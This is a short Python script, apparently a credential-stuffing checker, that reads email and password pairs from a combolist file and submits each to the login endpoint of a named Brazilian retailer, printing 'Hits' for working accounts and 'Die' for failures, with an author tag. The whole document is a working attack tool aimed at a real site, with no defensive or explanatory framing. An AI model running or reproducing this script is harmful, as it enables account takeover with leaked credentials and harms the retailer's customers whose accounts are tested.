import requests
    
combolist = open("combo.txt").readlines()

for combo in combolist:
    seq = combo.strip()
    acc = seq.split("|")

    email = acc[0]
    senha = acc[1]

    url = "https://ecommerce.cea.com.br/vtex/login"

    postdata = {
        "email": email,
        "senha": senha
    }

    post = requests.post(url = url, data=postdata).text

    if "Success" in post:
        print(f'Hits - {email}|{senha} @NIX3r')

    else:
        print(f'Die - {email}|{senha} @NIX3r')